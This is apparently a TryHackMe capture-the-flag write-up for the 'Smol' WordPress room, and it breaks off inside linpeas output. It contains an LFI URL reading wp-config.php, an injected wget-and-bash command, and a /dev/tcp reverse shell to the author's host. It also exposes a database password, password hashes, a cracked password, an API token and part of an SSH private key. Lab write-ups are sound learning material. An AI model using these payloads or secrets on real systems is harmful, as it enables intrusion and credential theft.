---
title: Smol
difficulty: Medium
platform: THM
tags:
tools:
date: 2026-03-03
---
![](../THM%20Challenge%20Rooms%20-%20Red%20Easy/Obsidian%20assets/Smol-3.png)

> [!important]
> At the heart of **Smol** is a WordPress website, a common target due to its extensive plugin ecosystem. 
> 
> The machine showcases a publicly known vulnerable plugin, highlighting the risks of neglecting software updates and security patches. 
> 
> Enhancing the learning experience, Smol introduces a backdoored plugin, emphasizing the significance of meticulous code inspection before integrating third-party components.
> 
> Target IP Address: 10.114.165.225
> 
> What is the user flag?

> [!info]
> OK, first medium THM room, let's start with enumeration as always.

```
> sudo nmap -p- -A -O -sVC www.smol.thm
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-03 12:51 +0000
Nmap scan report for www.smol.thm (10.114.165.225)
Host is up (0.022s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 9e:da:82:29:3f:ce:c1:86:57:2c:1e:c2:1d:ac:9f:bc (RSA)
|   256 4a:40:6d:19:f7:19:97:c0:5c:13:71:01:83:c3:d2:17 (ECDSA)
|_  256 0c:ce:2d:62:11:c2:00:8b:ee:70:41:19:f0:bf:f0:56 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: AnotherCTF
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-generator: WordPress 6.7.1
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.98%E=4%D=3/3%OT=22%CT=1%CU=39188%PV=Y%DS=3%DC=T%G=Y%TM=69A6D995
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)SEQ(
OS:SP=107%GCD=1%ISR=106%TI=Z%TS=A)SEQ(SP=FD%GCD=1%ISR=105%TI=Z%CI=Z%II=I%TS
OS:=A)SEQ(SP=FD%GCD=1%ISR=106%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=FE%GCD=1%ISR=108%T
OS:I=Z%CI=Z%II=I%TS=A)OPS(O1=M4E8ST11NW7%O2=M4E8ST11NW7%O3=M4E8NNT11NW7%O4=
OS:M4E8ST11NW7%O5=M4E8ST11NW7%O6=M4E8ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4
OS:B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M4E8NNSNW7%CC=Y%Q=)T1(R=Y%
OS:DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=N)T4(R=Y%DF=Y%T=40%W=
OS:0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=N)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD
OS:=0%Q=)T6(R=N)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=N)T7(R=Y%D
OS:F=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL
OS:=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 3 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 5900/tcp)
HOP RTT      ADDRESS
1   18.78 ms 192.168.128.1
2   ...
3   20.30 ms www.smol.thm (10.114.165.225)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 47.90 seconds
```

> [!note]
> Only two ports opened and had to add www.smol.thm to the /etc/hosts file.

```
> searchsploit 6.7.1
-------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                              |  Path
-------------------------------------------------------------------------------------------- ---------------------------------
AnyDVD 6.7.1.0 - Denial of Service                                                          | windows_x86/dos/15306.pl
Cisco Firepower Management Center < 6.6.7.1 - Authenticated RCE                             | hardware/webapps/51881.py
Man-db 2.6.7.1 - Local Privilege Escalation                                                 | linux/local/41158.md
McAfee Email Gateway 6.7.1 - 'systemWebAdminConfig.do' Remote Security Bypass               | windows/remote/34013.txt
MedDream PACS Server Premium 6.7.1.1 - 'email' SQL Injection                                | php/webapps/45344.txt
PHPCompta/NOALYSS 6.7.1 5638 - Remote Command Execution                                     | php/webapps/34861.txt
Softneta MedDream PACS Server Premium 6.7.1.1 - Directory Traversal                         | php/webapps/45347.txt
SolarWinds Kiwi Syslog Server 9.6.7.1 - Unquoted Service Path                               | windows/local/52064.txt
WordPress Theme Newspaper 6.7.1 - Privilege Escalation                                      | php/webapps/39894.php
-------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

> [!note]
> While awaiting gobuster web directory enumeration - I decided to look up wordpress 6.7.1 vulnerabilities and saw on searchsploit and exploit DB https://www.exploit-db.com/exploits/39894 paths for PE further into the pen test so I'll keep it aside for now.

```
> gobuster dir -u http://www.smol.thm/  -w /usr/share/wordlists/dirbuster-big.txt  -t 40
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://www.smol.thm/
[+] Method:                  GET
[+] Threads:                 40
[+] Wordlist:                /usr/share/wordlists/dirbuster-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
wp-content           (Status: 301) [Size: 317] [--> http://www.smol.thm/wp-content/]
wp-includes          (Status: 301) [Size: 318] [--> http://www.smol.thm/wp-includes/]
wp-admin             (Status: 301) [Size: 315] [--> http://www.smol.thm/wp-admin/]
server-status        (Status: 403) [Size: 277]
Progress: 1185252 / 1185252 (100.00%)
===============================================================
Finished
===============================================================
```

> [!note]
> ran gobuster with access to 3 web dirs - wp-content didn't reveal anything, just a white page. 
> wp-includes revealed a lot of dirs which from the start information would lead me to believe one of the plugins in vulnerable for me to get the initial foothold but I will continue to enumerate for now.

![](../THM%20Challenge%20Rooms%20-%20Red%20Easy/Obsidian%20assets/Smolwp-includes.png)
> [!note]
> Ok interesting I think - the wp-admin page changed the URL into http://www.smol.thm/wp-login.php?redirect_to=http%3A%2F%2Fwww.smol.thm%2Fwp-admin%2F&reauth=1

> [!info]
> Learnt to use wpscan with apitoken which is specific to word press for automating scan to find vuln information:

```
[+] Elapsed time: 00:00:20
 ~                                                                                                    took 23s | at 17:31:50
> wpscan --url http://www.smol.thm --api-token 9P3ub5jnWnDFhkle2xNzmtAHdIUnITwj685IwqDiGpc -e
 ~                                                                                                         INT | at 17:32:10
> wpscan --url http://www.smol.thm -e u,vp,vt --plugins-detection aggressive --api-token 9P3ub5jnWnDFhkle2xNzmtAHdIUnITwj685Iw
WARNING: Nokogiri was built against libxml version 2.14.2, but has dynamically loaded 2.15.1
WARNING: Nokogiri was built against libxslt version 1.1.43, but has dynamically loaded 1.1.45
/usr/lib/ruby/3.4.0/readline.rb:4: warning: reline was loaded from the standard library, but will no longer be part of the def
You can add reline to your Gemfile or gemspec to silence this warning.
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://www.smol.thm/ [10.112.173.1]
[+] Started: Tue Mar  3 17:32:27 2026

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://www.smol.thm/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://www.smol.thm/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://www.smol.thm/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://www.smol.thm/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.7.1 identified (Insecure, released on 2024-11-21).
 | Found By: Rss Generator (Passive Detection)
 |  - http://www.smol.thm/index.php/feed/, <generator>https://wordpress.org/?v=6.7.1</generator>
 |  - http://www.smol.thm/index.php/comments/feed/, <generator>https://wordpress.org/?v=6.7.1</generator>
 |
 | [!] 2 vulnerabilities identified:
 |
 | [!] Title: WP < 6.8.3 - Author+ DOM Stored XSS
 |     Fixed in: 6.7.4
 |     References:
 |      - https://wpscan.com/vulnerability/c4616b57-770f-4c40-93f8-29571c80330a
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-58674
 |      - https://patchstack.com/database/wordpress/wordpress/wordpress/vulnerability/wordpress-wordpress-wordpress-6-8-2-cros
 |      -  https://wordpress.org/news/2025/09/wordpress-6-8-3-release/
 |
 | [!] Title: WP < 6.8.3 - Contributor+ Sensitive Data Disclosure
 |     Fixed in: 6.7.4
 |     References:
 |      - https://wpscan.com/vulnerability/1e2dad30-dd95-4142-903b-4d5c580eaad2
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-58246
 |      - https://patchstack.com/database/wordpress/wordpress/wordpress/vulnerability/wordpress-wordpress-wordpress-6-8-2-sens
 |      - https://wordpress.org/news/2025/09/wordpress-6-8-3-release/

[+] WordPress theme in use: twentytwentythree
 | Location: http://www.smol.thm/wp-content/themes/twentytwentythree/
 | Last Updated: 2024-11-13T00:00:00.000Z
 | Readme: http://www.smol.thm/wp-content/themes/twentytwentythree/readme.txt
 | [!] The version is out of date, the latest version is 1.6
 | [!] Directory listing is enabled
 | Style URL: http://www.smol.thm/wp-content/themes/twentytwentythree/style.css
 | Style Name: Twenty Twenty-Three
 | Style URI: https://wordpress.org/themes/twentytwentythree
 | Description: Twenty Twenty-Three is designed to take advantage of the new design tools introduced in WordPress 6....
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://www.smol.thm/wp-content/themes/twentytwentythree/style.css, Match: 'Version: 1.2'

[+] Enumerating Vulnerable Plugins (via Aggressive Methods)
 Checking Known Locations - Time: 00:00:31 <============================================> (7343 / 7343) 100.00% Time: 00:00:31
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] jsmol2wp
 | Location: http://www.smol.thm/wp-content/plugins/jsmol2wp/
 | Latest Version: 1.07 (up to date)
 | Last Updated: 2018-03-09T10:28:00.000Z
 | Readme: http://www.smol.thm/wp-content/plugins/jsmol2wp/readme.txt
 | [!] Directory listing is enabled
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://www.smol.thm/wp-content/plugins/jsmol2wp/, status: 200
 |
 | [!] 2 vulnerabilities identified:
 |
 | [!] Title: JSmol2WP <= 1.07 - Unauthenticated Cross-Site Scripting (XSS)
 |     References:
 |      - https://wpscan.com/vulnerability/0bbf1542-6e00-4a68-97f6-48a7790d1c3e
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20462
 |      - https://www.cbiu.cc/2018/12/WordPress%E6%8F%92%E4%BB%B6jsmol2wp%E6%BC%8F%E6%B4%9E/#%E5%8F%8D%E5%B0%84%E6%80%A7XSS
 |
 | [!] Title: JSmol2WP <= 1.07 - Unauthenticated Server Side Request Forgery (SSRF)
 |     References:
 |      - https://wpscan.com/vulnerability/ad01dad9-12ff-404f-8718-9ebbd67bf611
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20463
 |      - https://www.cbiu.cc/2018/12/WordPress%E6%8F%92%E4%BB%B6jsmol2wp%E6%BC%8F%E6%B4%9E/#%E5%8F%8D%E5%B0%84%E6%80%A7XSS
 |
 | Version: 1.07 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://www.smol.thm/wp-content/plugins/jsmol2wp/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://www.smol.thm/wp-content/plugins/jsmol2wp/readme.txt

[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:02 <==============================================> (652 / 652) 100.00% Time: 00:00:02
[+] Checking Theme Versions (via Passive and Aggressive Methods)

[i] No themes Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] Jose Mario Llado Marti
 | Found By: Rss Generator (Passive Detection)

[+] wordpress user
 | Found By: Rss Generator (Passive Detection)

[+] admin
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://www.smol.thm/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] think
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://www.smol.thm/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] wp
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://www.smol.thm/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)

[+] diego
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] gege
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] xavi
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 1
 | Requests Remaining: 21

[+] Finished: Tue Mar  3 17:33:06 2026
[+] Requests Done: 8023
[+] Cached Requests: 60
[+] Data Sent: 2.134 MB
[+] Data Received: 1.126 MB
[+] Memory used: 295.363 MB
[+] Elapsed time: 00:00:38
 ~
```

> [!note]
> Okay found the attack surface to explore which is jsmol2wp version 1.07 and found a number of usernames. The vulns is cross-site scripting (XSS) & server-side request forgery (SSRF). Let's see which one gets us in.

```
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the installation.
 * You don't have to use the web site, you can copy this file to "wp-config.php"
 * and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * Database settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/documentation/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** Database username */
define( 'DB_USER', 'wpuser' );

/** Database password */
define( 'DB_PASSWORD', 'kbLSF2Vop#lw3rjDZ629*Z%G' );

/** Database hostname */
define( 'DB_HOST', 'localhost' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );
```

> [!note]
> From wpscan - it led me to this link https://wpscan.com/vulnerability/ad01dad9-12ff-404f-8718-9ebbd67bf611/ which led me to a LFI exploit to get a DB password it seems: http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php as shown above.

![](../THM%20Challenge%20Rooms%20-%20Red%20Easy/Obsidian%20assets/Smolim%20in.png)

![](../THM%20Challenge%20Rooms%20-%20Red%20Easy/Obsidian%20assets/Smolim%20inn.png)

> [!note]
> Ok, I'm in but lets enumerate what we can find here now.

![](../THM%20Challenge%20Rooms%20-%20Red%20Easy/Obsidian%20assets/Smolprivvate%20file.png)

> [!note]
> After checking if file upload was possible, I found a private file which mentions the hello dolly plugin that can lead to backdoor access.

![](../THM%20Challenge%20Rooms%20-%20Red%20Easy/Obsidian%20assets/Smolhello%20dolly.png)

> [!note]
> ok found the right directory traversal path to hello.php which leads to RCE

![](../THM%20Challenge%20Rooms%20-%20Red%20Easy/Obsidian%20assets/Smolbase64.png)

![](../THM%20Challenge%20Rooms%20-%20Red%20Easy/Obsidian%20assets/Smolbase64%20decoded.png)

> [!note]
>Because im logged in as admin, hello dolly and the PHP code above, I can execute RCE in the URL via GET parameter as shown below screenshot:

![](../THM%20Challenge%20Rooms%20-%20Red%20Easy/Obsidian%20assets/Smolwhoami.png)

> [!note]
> Took a little while to figure this out but got there in the end.
> First create a txt file for the rev shell called webshell.sh and got a little help generating the script for it with rev shell generator and AI: sh -i >& /dev/tcp/192.168.148.210/4444 0>&1 which was then piped into bash to activate the cmd.
> 
> python3 -m http.server 8000 was used to send the file locally from my PC to smol.thm via the custom url: http://www.smol.thm/wp-admin/index.php?cmd=wget%20http://192.168.148.210:8000/webshell.sh%20-O%20/tmp/w.sh%3Bbash%20/tmp/w.sh

```
> nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.112.173.1 41032
sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

```
www-data@ip-10-112-173-1:/var/www/wordpress/wp-admin$ cd /
www-data@ip-10-112-173-1:/$ ls
bin   dev  home  lib32  libx32      media  opt   root  sbin  swap.img  tmp  var
boot  etc  lib   lib64  lost+found  mnt    proc  run   srv   sys       usr
www-data@ip-10-112-173-1:/$ cd opt
www-data@ip-10-112-173-1:/opt$ ls
wp_backup.sql
www-data@ip-10-112-173-1:/opt$ ls -la
total 296
drwxr-xr-x  2 root root   4096 Mar 29  2024 .
drwxr-xr-x 18 root root   4096 Mar  3 15:55 ..
-rw-r--r--  1 root root 291970 Mar 29  2024 wp_backup.sql
www-data@ip-10-112-173-1:/opt$
```

> [!note]
> Tried to gain access to users but only able to get into one user which was ssm_user - remembering earlier that we had credentials for a DB so looking online i found that a wordpress sql DB can be stored in opts

```
www-data@ip-10-112-186-157:/opt$ mysql -u wpuser -p
Enter password:
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 28
Server version: 8.0.42-0ubuntu0.20.04.1 (Ubuntu)
Copyright (c) 2000, 2025, Oracle and/or its affiliates.
Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
mysql> SHOW databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| wordpress          |
+--------------------+
5 rows in set (0.00 sec)

mysql> SHOW wordpress;
ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for t
mysql> SELECT * FROM wordpress
    ->
    -> ;
ERROR 1046 (3D000): No database selected
mysql> use wordpress;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+---------------------------+
| Tables_in_wordpress       |
+---------------------------+
| wp_bp_activity            |
| wp_bp_activity_meta       |
| wp_bp_invitations         |
| wp_bp_messages_messages   |
| wp_bp_messages_meta       |
| wp_bp_messages_notices    |
| wp_bp_messages_recipients |
| wp_bp_notifications       |
| wp_bp_notifications_meta  |
| wp_bp_optouts             |
| wp_bp_xprofile_data       |
| wp_bp_xprofile_fields     |
| wp_bp_xprofile_groups     |
| wp_bp_xprofile_meta       |
| wp_commentmeta            |
| wp_comments               |
| wp_links                  |
| wp_options                |
| wp_postmeta               |
| wp_posts                  |
| wp_signups                |
| wp_term_relationships     |
| wp_term_taxonomy          |
| wp_termmeta               |
| wp_terms                  |
| wp_usermeta               |
| wp_users                  |
| wp_wysija_campaign        |
| wp_wysija_campaign_list   |
| wp_wysija_custom_field    |
| wp_wysija_email           |
| wp_wysija_email_user_stat |
| wp_wysija_email_user_url  |
| wp_wysija_form            |
| wp_wysija_list            |
| wp_wysija_queue           |
| wp_wysija_url             |
| wp_wysija_url_mail        |
| wp_wysija_user            |
| wp_wysija_user_field      |
| wp_wysija_user_history    |
| wp_wysija_user_list       |
+---------------------------+
42 rows in set (0.00 sec)

mysql> describe wp_users;
+---------------------+-----------------+------+-----+---------------------+----------------+
| Field               | Type            | Null | Key | Default             | Extra          |
+---------------------+-----------------+------+-----+---------------------+----------------+
| ID                  | bigint unsigned | NO   | PRI | NULL                | auto_increment |
| user_login          | varchar(60)     | NO   | MUL |                     |                |
| user_pass           | varchar(255)    | NO   |     |                     |                |
| user_nicename       | varchar(50)     | NO   | MUL |                     |                |
| user_email          | varchar(100)    | NO   | MUL |                     |                |
| user_url            | varchar(100)    | NO   |     |                     |                |
| user_registered     | datetime        | NO   |     | 0000-00-00 00:00:00 |                |
| user_activation_key | varchar(255)    | NO   |     |                     |                |
| user_status         | int             | NO   |     | 0                   |                |
| display_name        | varchar(250)    | NO   |     |                     |                |
+---------------------+-----------------+------+-----+---------------------+----------------+
10 rows in set (0.00 sec)
mysql> SELECT user_login, user_pass, user_email, user_activation_key FROM wp_users
    -> ;
+------------+------------------------------------+--------------------+---------------------+
| user_login | user_pass                          | user_email         | user_activation_key |
+------------+------------------------------------+--------------------+---------------------+
| admin      | $P$BH.CF15fzRj4li7nR19CHzZhPmhKdX. | admin@smol.thm     |                     |
| wpuser     | $P$BfZjtJpXL9gBwzNjLMTnTvBVh2Z1/E. | wp@smol.thm        |                     |
| think      | $P$BOb8/koi4nrmSPW85f5KzM5M/k2n0d/ | josemlwdf@smol.thm |                     |
| gege       | $P$B1UHruCd/9bGD.TtVZULlxFrTsb3PX1 | gege@smol.thm      |                     |
| diego      | $P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1 | diego@local        |                     |
| xavi       | $P$BB4zz2JEnM2H3WE2RHs3q18.1pvcql1 | xavi@smol.thm      |                     |
+------------+------------------------------------+--------------------+---------------------+
6 rows in set (0.00 sec)
```

> [!note]
> Using previously taken DB creds, I was able to find hashed passwords from the Mysql DB specifically from the wordpress DB in the wp_users table.

```
> hashcat -m 18200 UPSmol.txt /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

Successfully initialized the NVIDIA main driver CUDA runtime library.

Failed to initialize NVIDIA RTC library.

* Device #1: CUDA SDK Toolkit not installed or incorrectly installed.
             CUDA SDK Toolkit required for proper device support and utilization.
             For more information, see: https://hashcat.net/faq/wrongdriver
             Falling back to OpenCL runtime.

OpenCL API (OpenCL 3.0 CUDA 13.1.112) - Platform #1 [NVIDIA Corporation]
========================================================================
* Device #01: NVIDIA GeForce RTX 2080, 7783/7783 MB (1945 MB allocatable), 46MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashfile 'UPSmol.txt' on line 1 ($P$BH.CF15fzRj4li7nR19CHzZhPmhKdX.): Separator unmatched
Hashfile 'UPSmol.txt' on line 2 ($P$BfZjtJpXL9gBwzNjLMTnTvBVh2Z1/E.): Separator unmatched
Hashfile 'UPSmol.txt' on line 3 ($P$BOb8/koi4nrmSPW85f5KzM5M/k2n0d/): Separator unmatched
Hashfile 'UPSmol.txt' on line 4 ($P$B1UHruCd/9bGD.TtVZULlxFrTsb3PX1): Separator unmatched
Hashfile 'UPSmol.txt' on line 5 ($P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1): Separator unmatched
Hashfile 'UPSmol.txt' on line 6 ($P$BB4zz2JEnM2H3WE2RHs3q18.1pvcql1): Separator unmatched
No hashes loaded.

Started: Wed Mar  4 15:09:02 2026
Stopped: Wed Mar  4 15:09:02 2026
```

> [!note]
> Failed hashcat so need to know where I went wrong or what is the situation?

```
> hashcat  UPSmol.txt /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting in autodetect mode

Successfully initialized the NVIDIA main driver CUDA runtime library.

Failed to initialize NVIDIA RTC library.

* Device #1: CUDA SDK Toolkit not installed or incorrectly installed.
             CUDA SDK Toolkit required for proper device support and utilization.
             For more information, see: https://hashcat.net/faq/wrongdriver
             Falling back to OpenCL runtime.

OpenCL API (OpenCL 3.0 CUDA 13.1.112) - Platform #1 [NVIDIA Corporation]
========================================================================
* Device #01: NVIDIA GeForce RTX 2080, 7783/7783 MB (1945 MB allocatable), 46MCU

Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

400 | phpass | Generic KDF

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 6 digests; 6 unique digests, 6 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 1035 MB (9579 MB free)

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344391
* Bytes.....: 139921497
* Keyspace..: 14344384
* Runtime...: 0 secs

$P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1:sandiegocalifornia

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework
[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit =>
Approaching final keyspace - workload adjusted.
Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 400 (phpass)
Hash.Target......: UPSmol.txt
Time.Started.....: Wed Mar  4 15:12:09 2026 (36 secs)
Time.Estimated...: Wed Mar  4 15:12:45 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  2033.6 kH/s (12.18ms) @ Accel:11 Loops:1024 Thr:512 Vec:1
Recovered........: 1/6 (16.67%) Digests (total), 1/6 (16.67%) Digests (new), 1/6 (16.67%) Salts
Progress.........: 86066304/86066304 (100.00%)
Rejected.........: 0/86066304 (0.00%)
Restore.Point....: 14344384/14344384 (100.00%)
Restore.Sub.#01..: Salt:5 Amplifier:0-1 Iteration:7168-8192
Candidate.Engine.: Device Generator
Candidates.#01...: 0102940934 -> $HEX[042a0337c2a156616d6f732103]
Hardware.Mon.#01.: Temp: 66c Fan: 51% Util: 97% Core:1920MHz Mem:7000MHz Bus:16

Started: Wed Mar  4 15:12:00 2026
Stopped: Wed Mar  4 15:12:46 2026
> hashcat  UPSmol.txt /usr/share/wordlists/rockyou.txt --show
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

400 | phpass | Generic KDF

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

$P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1:sandiegocalifornia
```

> [!note]
> The password revealed belongs to Diego! so lets try that now.

```
www-data@ip-10-112-186-157:/opt$ su diego
Password:
diego@ip-10-112-186-157:/opt$ ^C
diego@ip-10-112-186-157:/opt$ cd /
diego@ip-10-112-186-157:/$ cd home/diego/
diego@ip-10-112-186-157:~$ ls
user.txt
diego@ip-10-112-186-157:~$ cat user.txt
45edaec653ff9ee06236b7ce72b86963
```

> [!important]
> What is the root flag?

> [!note]
> Lets see what Linpeas can find for us for PE:

```
-rwxr-xr-x 1 think think 2602 Jun 21  2023 /home/think/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAxGtoQjY5NUymuD+3b0xzEYIhdBbsnicrrnvkMjOgdbp8xYKrfOgM
ehrkrEXjcqmrFvZzp0hnVnbaCyUV8vDrywsrEivK7d5IDefssH/RqRinOY3FEYE+ekzKoH
+S6+jNEKedMH7DamLsXxsAG5b/Avm+FpWmvN1yS5sTeCeYU0wsHMP+cfM1cYcDkDU6HmiC
A2G4D5+uPluSH13TS12JpFyU3EjHQvV6evERecriHSfV0PxMrrwJEyOwSPYA2c7RlYh+tb
bniQRVAGE0Jato7kqAJOKZIuXHEIKhBnFOIt5J5sp6l/QfXxZYRMBaiuyNttOY1byNwj6/
EEyQe1YM5chhtmJm/RWog8U6DZf8BgB2KoVN7k11VG74+cmFMbGP6xn1mQG6i2u3H6WcY1
